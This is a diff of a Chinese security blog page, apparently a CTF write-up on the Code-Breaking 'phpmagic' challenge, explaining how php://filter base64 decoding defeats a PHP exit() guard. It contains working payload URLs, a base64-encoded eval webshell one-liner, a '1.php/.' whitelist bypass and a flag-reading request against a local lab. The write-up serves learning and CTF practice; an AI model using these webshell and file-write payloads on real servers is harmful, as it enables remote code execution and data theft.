@@ -1,350 +1,519 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="前言利用code-breaking学学奇淫技巧 base64编码以三个字符为一组经过base64加密形成四个字符，如果最后一组不足三个字符，使用0填充形成”&#x3D;”字符 -&gt; ASCII -&gt; 8bit字节 -&gt; 6bit字节 -&gt; 十进制 -&gt; 对应编码 123456            T           o           mASCII:      84">
-<meta property="og:type" content="article">
-<meta property="og:title" content="php:&#x2F;&#x2F;filter编码绕过">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="前言利用code-breaking学学奇淫技巧 base64编码以三个字符为一组经过base64加密形成四个字符，如果最后一组不足三个字符，使用0填充形成”&#x3D;”字符 -&gt; ASCII -&gt; 8bit字节 -&gt; 6bit字节 -&gt; 十进制 -&gt; 对应编码 123456            T           o           mASCII:      84">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/1.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/2.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/3.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/4.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/5.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/6.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/7.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/8.png">
-<meta property="article:published_time" content="2019-03-24T06:13:00.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:31:30.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="WEB安全">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/1.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>php://filter编码绕过</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>php://filter编码绕过 - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/03/24/preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/03/22/phpMyAdmin%E5%90%8E%E5%8F%B0LFI-RCE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&text=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&is_video=false&description=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=php://filter编码绕过&body=Check out this article: http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&name=php://filter编码绕过&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&t=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#base64编码"><span class="toc-number">2.</span> <span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-filter编码绕过exit"><span class="toc-number">3.</span> <span class="toc-text">php:&#x2F;&#x2F;filter编码绕过exit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Codebeaking-phpmagic"><span class="toc-number">4.</span> <span class="toc-text">Codebeaking-phpmagic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用"><span class="toc-number">5.</span> <span class="toc-text">利用</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        php://filter编码绕过
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-03-24T06:13:00.000Z" itemprop="datePublished">2019-03-24</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a>
-    </div>
-
-
-      <span id="/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/" class="leancloud_visitors" data-flag-title="php://filter编码绕过">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用code-breaking学学奇淫技巧</p>
-<h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><p>以三个字符为一组经过base64加密形成四个字符，如果最后一组不足三个字符，使用0填充形成”=”<br><strong>字符 -&gt; ASCII -&gt; 8bit字节 -&gt; 6bit字节 -&gt; 十进制 -&gt; 对应编码</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">            T           o           m</span><br><span class="line">ASCII:      84          111         109</span><br><span class="line">8bit字节:   01010100    01101111    01101101</span><br><span class="line">6bit字节:     010101      000110      111101      101101</span><br><span class="line">十进制:     21          6           61          45</span><br><span class="line">对应编码:   V           G           9           t</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">            L           u           c           y</span><br><span class="line">ASCII:      76          117         99          121</span><br><span class="line">8bit字节:   01001100    01110101    01100011    01111001      00000000    00000000</span><br><span class="line">6bit字节:     010011      000111      010101      100011      011110  010000  000000  000000</span><br><span class="line">十进制:     19          7           21          35             30      16      (异常) (异常)      </span><br><span class="line">对应编码:   T           H           V           j               e       Q       &#x3D;       &#x3D;</span><br></pre></td></tr></table></figure>
-
-<h1 id="php-filter编码绕过exit"><a href="#php-filter编码绕过exit" class="headerlink" title="php://filter编码绕过exit"></a>php://filter编码绕过exit</h1><p><img src="./1.png" alt=""><br>如上代码即使写入webshell，也会被exit给shutdown</p>
-<p>献上payload<br><code>http://127.0.0.1/exit.php?filename=php://filter/write=convert.base64-decode/reesource=1.php&amp;content=xPD9waHAgcGhwaW5mbygpOw==</code><br>webshell 前的x是我故意加上去，可以看到exit语句被编码之后形成乱码。<br><img src="./2.png" alt=""></p>
-<p>接下来分析下缘由，需要写入<code>webshell</code>，但是由于<code>exit</code>的存在，导致<code>getshell</code>失败。这里用到的绕过知识是<code>php</code>中<code>base64_decode</code>只会对<code>[^a-z0-9A-Z+/]</code>解码，而字符<code>&lt;、?、;、&gt;、空格</code>等一共有7个字符不符合<code>base64</code>编码的字符范围将被忽略。所以<code>base64_decode</code>只作用于<code>phpexit</code>,但本题中<code>&lt;?php phpinfo();</code>base64之后为4的倍数，但是拼接<code>phpexit</code>七个字节之后不满足base64解码条件以4个字节为一组解码。所以我们在前面加个字母<code>x</code></p>
-<p><img src="./3.png" alt=""></p>
-<h1 id="Codebeaking-phpmagic"><a href="#Codebeaking-phpmagic" class="headerlink" title="Codebeaking-phpmagic"></a>Codebeaking-phpmagic</h1><p><img src="./4.png" alt=""><br>代码功能主要通过<code>dig -t A -q</code>对输入的<code>domain</code>网址进行dns解析。但是我们的目的是写入shell得到flag。本来想着看是否能够绕过<code>escapeshellarg</code>达到<code>getshell</code>目的，可能太渣没有发现绕过的方法。</p>
-<p>目光转到了写入文件<code>file_put_contents($log_name, $output);</code>很容易想到使用<code>php伪协议</code>，发现log_name是由<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>和<code>$log_name</code>拼接而成。当开启<code>UseCanonicalName=ON</code>和<code>ServerName</code>，可以通过客户端控制。<br><img src="./5.png" alt=""></p>
-<p><code>logname</code>被<code>in_array</code>白名单强判断，需要绕过。这里参考<br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a><br>php会对 <code>1.php/.</code> 解析为<code>1.php</code>。且这里<code>1.php/.</code>也能绕过<code>in_array</code>判断</p>
-<p><img src="./6.png" alt=""><br><code>out_put</code>被<code>htmlspecialchars</code>实体编码直接写入一句话会被转义,这里就可以使用<code>base64一句话木马进行getshell</code>。</p>
-<p>NOTIC:尽量使得<code>webshell</code>满足3的整数倍注意base64之后的一句话不要带有<code>&quot;=&quot;</code> 否则会读取失败</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_GET[456]);&#x2F;*....  &#x3D;》 PD9waHAgQGV2YWwoJF9HRVRbNDU2XSk7LyouLi4u</span><br></pre></td></tr></table></figure>
-
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p><img src="./7.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;data&#x2F;2ff4fb82e497844a03adf28cf6bedfde&#x2F;7.php?456&#x3D;print_r(scandir(%27..&#x2F;..&#x2F;..&#x2F;%27));highlight_file(%27..&#x2F;..&#x2F;..&#x2F;flag_phpmag1c_ur1%27);</span><br></pre></td></tr></table></figure>
-
-<p><img src="./8.png" alt=""></p>
-<p><a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>
-
-  </div>
-</article>
-
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
+  
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
         
       </ul>
     </div>
+  </div>
+</nav>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#base64编码"><span class="toc-number">2.</span> <span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-filter编码绕过exit"><span class="toc-number">3.</span> <span class="toc-text">php:&#x2F;&#x2F;filter编码绕过exit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Codebeaking-phpmagic"><span class="toc-number">4.</span> <span class="toc-text">Codebeaking-phpmagic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用"><span class="toc-number">5.</span> <span class="toc-text">利用</span></a></li></ol>
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-03-24 14:13" pubdate>
+        2019年3月24日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      651 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      8
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
     </div>
+  </header>
 
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&text=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&is_video=false&description=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=php://filter编码绕过&body=Check out this article: http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&title=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&name=php://filter编码绕过&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/&t=php://filter编码绕过" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
+  <main>
+    
+      
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">php://filter编码绕过</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用code-breaking学学奇淫技巧</p>
+<h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><p>以三个字符为一组经过base64加密形成四个字符，如果最后一组不足三个字符，使用0填充形成”=”<br><strong>字符 -&gt; ASCII -&gt; 8bit字节 -&gt; 6bit字节 -&gt; 十进制 -&gt; 对应编码</strong></p>
+<pre><code class="hljs angelscript">            T           o           m
+ASCII:      <span class="hljs-number">84</span>          <span class="hljs-number">111</span>         <span class="hljs-number">109</span>
+<span class="hljs-number">8</span>bit字节:   <span class="hljs-number">01010100</span>    <span class="hljs-number">01101111</span>    <span class="hljs-number">01101101</span>
+<span class="hljs-number">6</span>bit字节:     <span class="hljs-number">010101</span>      <span class="hljs-number">000110</span>      <span class="hljs-number">111101</span>      <span class="hljs-number">101101</span>
+十进制:     <span class="hljs-number">21</span>          <span class="hljs-number">6</span>           <span class="hljs-number">61</span>          <span class="hljs-number">45</span>
+对应编码:   V           G           <span class="hljs-number">9</span>           t</code></pre>
+
+<pre><code class="hljs angelscript">            L           u           c           y
+ASCII:      <span class="hljs-number">76</span>          <span class="hljs-number">117</span>         <span class="hljs-number">99</span>          <span class="hljs-number">121</span>
+<span class="hljs-number">8</span>bit字节:   <span class="hljs-number">01001100</span>    <span class="hljs-number">01110101</span>    <span class="hljs-number">01100011</span>    <span class="hljs-number">01111001</span>      <span class="hljs-number">00000000</span>    <span class="hljs-number">00000000</span>
+<span class="hljs-number">6</span>bit字节:     <span class="hljs-number">010011</span>      <span class="hljs-number">000111</span>      <span class="hljs-number">010101</span>      <span class="hljs-number">100011</span>      <span class="hljs-number">011110</span>  <span class="hljs-number">010000</span>  <span class="hljs-number">000000</span>  <span class="hljs-number">000000</span>
+十进制:     <span class="hljs-number">19</span>          <span class="hljs-number">7</span>           <span class="hljs-number">21</span>          <span class="hljs-number">35</span>             <span class="hljs-number">30</span>      <span class="hljs-number">16</span>      (异常) (异常)      
+对应编码:   T           H           V           j               e       Q       =       =</code></pre>
+
+<h1 id="php-filter编码绕过exit"><a href="#php-filter编码绕过exit" class="headerlink" title="php://filter编码绕过exit"></a>php://filter编码绕过exit</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""><br>如上代码即使写入webshell，也会被exit给shutdown</p>
+<p>献上payload<br><code>http://127.0.0.1/exit.php?filename=php://filter/write=convert.base64-decode/reesource=1.php&amp;content=xPD9waHAgcGhwaW5mbygpOw==</code><br>webshell 前的x是我故意加上去，可以看到exit语句被编码之后形成乱码。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
+<p>接下来分析下缘由，需要写入<code>webshell</code>，但是由于<code>exit</code>的存在，导致<code>getshell</code>失败。这里用到的绕过知识是<code>php</code>中<code>base64_decode</code>只会对<code>[^a-z0-9A-Z+/]</code>解码，而字符<code>&lt;、?、;、&gt;、空格</code>等一共有7个字符不符合<code>base64</code>编码的字符范围将被忽略。所以<code>base64_decode</code>只作用于<code>phpexit</code>,但本题中<code>&lt;?php phpinfo();</code>base64之后为4的倍数，但是拼接<code>phpexit</code>七个字节之后不满足base64解码条件以4个字节为一组解码。所以我们在前面加个字母<code>x</code></p>
+<p><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
